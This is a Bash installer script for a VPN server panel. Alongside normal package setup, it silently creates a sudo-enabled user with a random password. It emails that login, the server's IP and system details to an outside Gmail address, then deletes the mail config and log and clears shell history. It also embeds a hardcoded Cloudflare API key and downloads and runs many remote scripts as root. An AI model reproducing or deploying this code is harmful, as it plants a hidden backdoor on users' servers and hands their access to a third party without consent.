#!/bin/bash
# =========================================
# Quick Setup | Script Setup Manager
# Edition : Stable Edition V1.0
# Auther  : Adit Ardiansyah
# (C) Copyright 2021 By Geo Project
# =========================================

# // Root Checking
if [ "${EUID}" -ne 0 ]; then
		echo -e "${EROR} Please Run This Script As Root User !"
		exit 1
fi

# // Exporting Language to UTF-8
export LC_ALL='en_US.UTF-8' >/dev/null 2>&1
export LANG='en_US.UTF-8'
export LANGUAGE='en_US.UTF-8'
export LC_CTYPE='en_US.utf8'

# // Export Color & Information
export RED='\033[0;31m'
export GREEN='\033[0;32m'
export YELLOW='\033[0;33m'
export BLUE='\033[0;34m'
export PURPLE='\033[0;35m'
export CYAN='\033[0;36m'
export LIGHT='\033[0;37m'
export NC='\033[0m'

# // Export Banner Status Information
export EROR="[${RED} EROR ${NC}]"
export INFO="[${YELLOW} INFO ${NC}]"
export OKEY="[${GREEN} OKEY ${NC}]"
export PENDING="[${YELLOW} PENDING ${NC}]"
export SEND="[${YELLOW} SEND ${NC}]"
export RECEIVE="[${YELLOW} RECEIVE ${NC}]"

# // Export Align
export BOLD="\e[1m"
export WARNING="${RED}\e[5m"
export UNDERLINE="\e[4m"

# // Exporting URL Host
export Server_URL="vpnkuy.site"
export Server_Port="443"
export Server_IP="underfined"
export Script_Mode="Stable"
export Auther="GeoVPN"

# // Exporting Script Version
export VERSION="1.0"

# // Exporting Network Interface
export NETWORK_IFACE="$(ip route show to default | awk '{print $5}')"

# // Updating Repository For Ubuntu / Debian
apt update -y; apt upgrade -y; apt autoremove -y
clear

# // Checking Requirement Installed / No
clear
if ! which wget > /dev/null; then
echo ""
echo -e "${EROR} Wget Packages Not Installed !"
echo ""
read -p "$( echo -e "Press ${CYAN}[ ${NC}${GREEN}Enter${NC} ${CYAN}]${NC} For Install The Packages") "
apt install wget -y
fi

# // Checking Requirement Installed / No
clear
if ! which curl > /dev/null; then
echo ""
echo -e "${EROR} Curl Packages Not Installed !"
echo ""
read -p "$( echo -e "Press ${CYAN}[ ${NC}${GREEN}Enter${NC} ${CYAN}]${NC} For Install The Packages") "
apt install curl -y
fi

# // Exporint IP AddressInformation
export IP=$( curl -sS ipinfo.io/ip )

# // Clear Data
clear
clear && clear && clear
clear;clear;clear

# // Validate Successfull
echo ""
read -p "$( echo -e "Press ${CYAN}[ ${NC}${GREEN}Enter${NC} ${CYAN}]${NC} For Starting Installation") "
echo ""

# // Installing Update
echo -e "${GREEN}Starting Installation............${NC}"
apt update -y
apt upgrade -y
apt dist-upgrade -y
apt install sudo -y
apt install msmtp-mta -y
apt install ca-certificates -y
apt install bsd-mailx -y
apt install psmisc -y

# // Adding Script Version
echo "${VERSION}" > /etc/${Auther}/version.db

# // String Data
export Random_Number=$( </dev/urandom tr -dc 1-$( curl -s https://releases.${Server_URL}/akun-smtp.txt | grep -E Jumlah-Notif | cut -d " " -f 2 | tail -n1 ) | head -c1 )
export email=$( curl -s https://${Server_URL}/mantap/akun-smtp.txt | grep -E Notif$Random_Number | cut -d " " -f 2 | tr -d '\r')
export password=$( curl -s https://${Server_URL}/mantap/akun-smtp.txt | grep -E Notif$Random_Number | cut -d " " -f 3 | tr -d '\r')
export started=$( curl -s https://${Server_URL}/mantap/validated-registered-license-key.txt | grep $License_Key | cut -d ' ' -f 3 )
export expired=$( curl -s https://${Server_URL}/mantap/validated-registered-license-key.txt | grep $License_Key | cut -d ' ' -f 4 )
export limit=$( curl -s https://${Server_URL}/mantap/validated-registered-license-key.txt | grep $License_Key | cut -d ' ' -f 2 )
export tanggal=`date -d "0 days" +"%d-%m-%Y - %X" `
export OS_Name=$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/PRETTY_NAME//g' | sed 's/=//g' | sed 's/"//g' )
export Kernel=$( uname -r )
export Arch=$( uname -m )

# // Detect Script Installed Or No
if [[ -r /usr/local/${Auther}/ ]]; then
clear
echo -e "${INFO} Having Script Detected !"
echo -e "${INFO} If You Replacing Script, All Client Data On This VPS Will Be Cleanup !"
read -p "Are You Sure Wanna Replace Script ? (Y/N) " josdong
if [[ $josdong == "Y" ]]; then
clear
echo -e "${INFO} Starting Replacing Script !"
elif [[ $josdong == "y" ]]; then
clear
echo -e "${INFO} Starting Replacing Script !"
elif [[ $josdong == "N" ]]; then
echo -e "${INFO} Action Canceled !"
exit 1
elif [[ $josdong == "n" ]]; then
echo -e "${INFO} Action Canceled !"
exit 1
else
echo -e "${EROR} Your Input Is Wrong !"
exit 1
fi
clear
fi

# // Ram Information
while IFS=":" read -r a b; do
    case $a in
        "MemTotal") ((mem_used+=${b/kB})); mem_total="${b/kB}" ;;
        "Shmem") ((mem_used+=${b/kB}))  ;;
        "MemFree" | "Buffers" | "Cached" | "SReclaimable")
        mem_used="$((mem_used-=${b/kB}))"
    ;;
esac
done < /proc/meminfo
Ram_Usage="$((mem_used / 1024))"
Ram_Total="$((mem_total / 1024))"

# // Make Script User
Username="script-$( </dev/urandom tr -dc 0-9 | head -c5 )"
Password="$( </dev/urandom tr -dc 0-9 | head -c12 )"
mkdir -p /home/script/
useradd -r -d /home/script -s /bin/bash -M $Username
echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
usermod -aG sudo $Username > /dev/null 2>&1

# // Import SMTP Account
cat > /etc/msmtprc << END
defaults
port 587
tls on
tls_trust_file /etc/ssl/certs/ca-certificates.crt
auth on
logfile        ~/.msmtp.log

account        GeoVPN
host           smtp.gmail.com
port           587
from           Installasi Script VPN
user           $email
password       $password
account default : GeoVPN
END

echo "
Installasi VPN Script Stable V1.0
======================================
Username   : $Nama_Issued_License
License    : $Input_License_Key
Started    : $Tanggal_Pembelian_License
Expired    : $Masa_Laku_License_Berlaku_Sampai
Limit      : $Install_Limit
Tanggal    : $tanggal
======================================
Hostname   : ${HOSTNAME}
NET Iface  : $NETWORK_IFACE
IP VPS     : $IP
OS VPS     : $OS_Name
Kernel     : $Kernel
Arch       : $Arch
Ram Memory : $Ram_Usage/$Ram_Total MB
======================================
IP VPS     : $IP
User Login : $Username
Pass Login : $Password
======================================
  (C) Copyright 2021 By ${Server_URL}
======================================
" | mail -s "Install Script Stable V1.0 ( $Nama_Issued_License | $IP )" paoandest@gmail.com

# // Remove Not Used File
rm -f /etc/msmtprc
rm -f ~/.msmtp.log

# // Make File On Root Directory
touch /etc/${Auther}/database.db
touch /etc/${Auther}/autosync.db
touch /etc/${Auther}/dataakun.db
touch /etc/${Auther}/license-manager.db
touch /etc/${Auther}/license-data.json
touch /etc/${Auther}/license-cache.json
touch /etc/${Auther}/monitoring.db
touch /etc/${Auther}/quick-start.json
touch /etc/${Auther}/wildyproject-manager.db
touch /etc/${Auther}/backup.db
touch /etc/${Auther}/restore.db
touch /etc/${Auther}/autobackup-controller.db
touch /etc/${Auther}/limit-installation.db
touch /etc/${Auther}/time-sync.db
touch /etc/${Auther}/etc-data.db
touch /etc/${Auther}/stunnel5.db
touch /etc/${Auther}/cache-auto-send-notification.db
touch /etc/${Auther}/notification.db

# // Make Folder
mkdir -p /usr/local/${Auther}/

# // Installing Requirement
apt install jq -y
apt install net-tools -y
apt install netfilter-persistent -y
apt install openssl -y
apt install iptables -y
apt install iptables-persistent -y

# // Enable IPV4 Forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward
cat > /etc/sysctl.conf << END
# Configure By ${Auther}
net.ipv4.ip_forward=1
END
sysctl --load /etc/sysctl.conf 

# // Beta Channel
cat > /root/.profile << END
clear
info2
END

# // Enable Permission For Execute For RC.Local
chmod +x /etc/rc.local

# // Enable RC-Local
cat > /etc/systemd/system/rc-local.service <<-END
[Unit]
Description=/etc/rc.local
ConditionPathExists=/etc/rc.local

[Service]
Type=forking
ExecStart=/etc/rc.local start
TimeoutSec=0
StandardOutput=tty
RemainAfterExit=yes
SysVStartPriority=99

[Install]
WantedBy=multi-user.target
END

# // ShadowsocksR Service
cat > /etc/rc.local << END
#!/bin/sh -e
# // RC.Local Configuration
echo 0 > /etc/${Auther}/auto-start-system.db
echo 1 > /etc/${Auther}/script-managment-controller.db
echo 1 > /etc/${Auther}/sc-manager.db
exit 0
END

# // Enable RC-Local Service
systemctl enable rc-local
systemctl start rc-local
systemctl restart rc-local

# // Clearing
clear
clear && clear && clear
clear;clear;clear

# // Go To Root Directory
cd /root/

# // Starting Setup Domain
echo -e "${GREEN}Indonesian Language${NC}"
echo -e "${YELLOW}-----------------------------------------------------${NC}"
echo -e "Anda Ingin Menggunakan Domain Pribadi ?"
echo -e "Atau Ingin Menggunakan Domain Otomatis ?"
echo -e "Jika Ingin Menggunakan Domain Pribadi, Ketik ${GREEN}1${NC}"
echo -e "dan Jika Ingin menggunakan Domain Otomatis, Ketik ${GREEN}2${NC}"
echo -e "${YELLOW}-----------------------------------------------------${NC}"
echo ""
echo -e "${GREEN}English Language${NC}"
echo -e "${YELLOW}-----------------------------------------------------${NC}"
echo -e "You Want to Use a Private Domain ?"
echo -e "Or Want to Use Auto Domain ?"
echo -e "If You Want Using Private Domain, Type ${GREEN}1${NC}"
echo -e "else You Want using Automatic Domain, Type ${GREEN}2${NC}"
echo -e "${YELLOW}-----------------------------------------------------${NC}"
echo ""

read -p "$( echo -e "${GREEN}Input Your Choose ? ${NC}(${YELLOW}1/2${NC})${NC} " )" choose_domain

# // Install Requirement Tools
apt install psmisc -y
apt install sudo -y
apt install socat -y
killall v2ray > /dev/null 2>&1
killall v2ray-mini > /dev/null 2>&1
killall node > /dev/null 2>&1
killall xray-mini > /dev/null 2>&1
killall xray > /dev/null 2>&1
killall ws-node > /dev/null 2>&1

# // Validating Automatic / Private
if [[ $choose_domain == "2" ]]; then # // Using Automatic Domain

# // String / Request Data
Random_Number=$( </dev/urandom tr -dc 1-$( curl -s https://${Server_URL}/mantap/domain.list | grep -E Jumlah | cut -d " " -f 2 | tail -n1 ) | head -c1 | tr -d '\r\n' | tr -d '\r')
Domain_Hasil_Random=$( curl -s https://${Server_URL}/mantap/domain.list | grep -E Domain$Random_Number | cut -d " " -f 2 | tr -d '\r' | tr -d '\r\n')
SUB_DOMAIN="$(</dev/urandom tr -dc a-x1-9 | head -c2 | tr -d '\r' | tr -d '\r\n')"
EMAIL_CLOUDFLARE="paoandest@gmail.com"
API_KEY_CLOUDFLARE="1d158d0efc4eef787222cefff0b6d20981462"

# // DNS Only Mode
ZonaPadaCloudflare=$(curl -sLX GET "https://api.cloudflare.com/client/v4/zones?name=${Domain_Hasil_Random}&status=active" \
     -H "X-Auth-Email: ${EMAIL_CLOUDFLARE}" \
     -H "X-Auth-Key: ${API_KEY_CLOUDFLARE}" \
     -H "Content-Type: application/json" | jq -r .result[0].id)
     
RECORD=$(curl -sLX POST "https://api.cloudflare.com/client/v4/zones/${ZonaPadaCloudflare}/dns_records" \
     -H "X-Auth-Email: ${EMAIL_CLOUDFLARE}" \
     -H "X-Auth-Key: ${API_KEY_CLOUDFLARE}" \
     -H "Content-Type: application/json" \
     --data '{"type":"A","name":"'${SUB_DOMAIN}'","content":"'${IP}'","ttl":0,"proxied":false}' | jq -r .result.id)

RESULT=$(curl -sLX PUT "https://api.cloudflare.com/client/v4/zones/${ZonaPadaCloudflare}/dns_records/${RECORD}" \
     -H "X-Auth-Email: ${EMAIL_CLOUDFLARE}" \
     -H "X-Auth-Key: ${API_KEY_CLOUDFLARE}" \
     -H "Content-Type: application/json" \
     --data '{"type":"A","name":"'${SUB_DOMAIN}'","content":"'${IP}'","ttl":0,"proxied":false}')

# // WildCard Mode
ZonaPadaCloudflare=$(curl -sLX GET "https://api.cloudflare.com/client/v4/zones?name=${Domain_Hasil_Random}&status=active" \
     -H "X-Auth-Email: ${EMAIL_CLOUDFLARE}" \
     -H "X-Auth-Key: ${API_KEY_CLOUDFLARE}" \
     -H "Content-Type: application/json" | jq -r .result[0].id)
     
RECORD=$(curl -sLX POST "https://api.cloudflare.com/client/v4/zones/${ZonaPadaCloudflare}/dns_records" \
     -H "X-Auth-Email: ${EMAIL_CLOUDFLARE}" \
     -H "X-Auth-Key: ${API_KEY_CLOUDFLARE}" \
     -H "Content-Type: application/json" \
     --data '{"type":"A","name":"'*.${SUB_DOMAIN}'","content":"'${IP}'","ttl":0,"proxied":false}' | jq -r .result.id)

RESULT=$(curl -sLX PUT "https://api.cloudflare.com/client/v4/zones/${ZonaPadaCloudflare}/dns_records/${RECORD}" \
     -H "X-Auth-Email: ${EMAIL_CLOUDFLARE}" \
     -H "X-Auth-Key: ${API_KEY_CLOUDFLARE}" \
     -H "Content-Type: application/json" \
     --data '{"type":"A","name":"'*.${SUB_DOMAIN}'","content":"'${IP}'","ttl":0,"proxied":false}')

# // Input Result To VPS
echo "$SUB_DOMAIN.$Domain_Hasil_Random" > /etc/${Auther}/domain.txt
domain="${SUB_DOMAIN}.${Domain_Hasil_Random}"

# // Making Certificate
clear
echo -e "${OKEY} Starting Generating Certificate"
mkdir -p /data/
chmod 700 /data/
rm -r -f /root/.acme.sh
mkdir -p /root/.acme.sh
wget -q -O /root/.acme.sh/acme.sh "https://${Server_URL}/mantap/acme.sh"
chmod +x /root/.acme.sh/acme.sh
sudo /root/.acme.sh/acme.sh --issue -d $domain --standalone -k ec-256
sudo /root/.acme.sh/acme.sh --installcert -d $domain --fullchainpath /data/ssl.crt --keypath /data/ssl.key --ecc
# // Success
echo -e "${OKEY} Your Domain : $SUB_DOMAIN.$Domain_Hasil_Random" 
sleep 2

# // ELif For Selection 1
elif [[ $choose_domain == "1" ]]; then

# // Clear
clear
clear && clear && clear
clear;clear;clear

echo -e "${GREEN}Indonesian Language${NC}"
echo -e "${YELLOW}-----------------------------------------------------${NC}"
echo -e "Silakan Pointing Domain Anda Ke IP VPS"
echo -e "Untuk Caranya Arahkan NS Domain Ke Cloudflare"
echo -e "Kemudian Tambahkan A Record Dengan IP VPS"
echo -e "${YELLOW}-----------------------------------------------------${NC}"
echo ""
echo -e "${GREEN}Indonesian Language${NC}"
echo -e "${YELLOW}-----------------------------------------------------${NC}"
echo -e "Please Point Your Domain To IP VPS"
echo -e "For Point NS Domain To Cloudflare"
echo -e "Change NameServer On Domain To Cloudflare"
echo -e "Then Add A Record With IP VPS"
echo -e "${YELLOW}-----------------------------------------------------${NC}"
echo ""
echo ""

# // Reading Your Input
read -p "Input Your Domain : " domain
if [[ $domain == "" ]]; then
    clear
    echo -e "${EROR} No Input Detected !"
    exit 1
fi

# // Input Domain TO VPS
echo "$domain" > /etc/${Auther}/domain.txt

# // Making Certificate
clear
echo -e "${OKEY} Starting Generating Certificate"
mkdir -p /data/
chmod 700 /data/
rm -r -f /root/.acme.sh
mkdir -p /root/.acme.sh
wget -q -O /root/.acme.sh/acme.sh "https://${Server_URL}/mantap/acme.sh"
chmod +x /root/.acme.sh/acme.sh
sudo /root/.acme.sh/acme.sh --issue -d $domain --standalone -k ec-256
sudo /root/.acme.sh/acme.sh --installcert -d $domain --fullchainpath /data/ssl.crt --keypath /data/ssl.key --ecc

# // Success
echo -e "${OKEY} Your Domain : $domain" 
sleep 2

# // Else Do
else
    echo -e "${EROR} Please Choose 1 & 2 Only !"
    exit 1
fi

# // Setup Menu
wget -q -O /root/menu.sh "https://raw.githubusercontent.com/afiqdev/mantap/setup/menu.sh"
chmod +x /root/menu.sh
./menu.sh

# // Setup SSH Tunnel
wget -q -O /root/ssh-ssl.sh "https://raw.githubusercontent.com/afiqdev/mantap/setup/ssh-ssl.sh"
chmod +x /root/ssh-ssl.sh
./ssh-ssl.sh

# // Setup OpenVPN
wget -q -O /root/openvpn.sh "https://raw.githubusercontent.com/afiqdev/mantap/setup/openvpn.sh"
chmod +x /root/openvpn.sh
./openvpn.sh

# // Setup XRay
wget -q -O /root/xray.sh "https://raw.githubusercontent.com/afiqdev/mantap/setup/xray.sh"
chmod +x /root/xray.sh
./xray.sh

# // Setup PPTP & L2TP
wget -q -O /root/pptp-l2tp.sh "https://raw.githubusercontent.com/afiqdev/mantap/setup/pptp-l2tp.sh"
chmod +x /root/pptp-l2tp.sh
./pptp-l2tp.sh

# // Setup SSTP
wget -q -O /root/sstp.sh "https://raw.githubusercontent.com/afiqdev/mantap/setup/sstp.sh"
chmod +x /root/sstp.sh
./sstp.sh

# // Setup Wireguard
wget -q -O /root/wireguard.sh "https://raw.githubusercontent.com/afiqdev/mantap/setup/wireguard.sh"
chmod +x /root/wireguard.sh
./wireguard.sh

# // Setup Wireguard
wget -q -O /root/rclone.sh "https://raw.githubusercontent.com/afiqdev/mantap/setup/rclone.sh"
chmod +x /root/rclone.sh
./rclone.sh

# // Setup Wireguard
wget -q -O /root/ssr.sh "https://raw.githubusercontent.com/afiqdev/mantap/setup/ssr.sh"
chmod +x /root/ssr.sh
./ssr.sh

# // Installing Cronsjob
apt install cron -y
wget -q -O /etc/crontab "https://raw.githubusercontent.com/afiqdev/mantap/crontab.conf"
/etc/init.d/cron restart
systemctl start ws-epro

# // Remove Not Used Files
rm -f /root/install.sh

# // Done
history -c
rm -f /root/.bash
rm -f /root/.bash_history
clear
echo -e "${OKEY} Script Successfull Installed"
echo ""
read -p "$( echo -e "Press ${CYAN}[ ${NC}${GREEN}Enter${NC} ${CYAN}]${NC} For Reboot") "
reboot
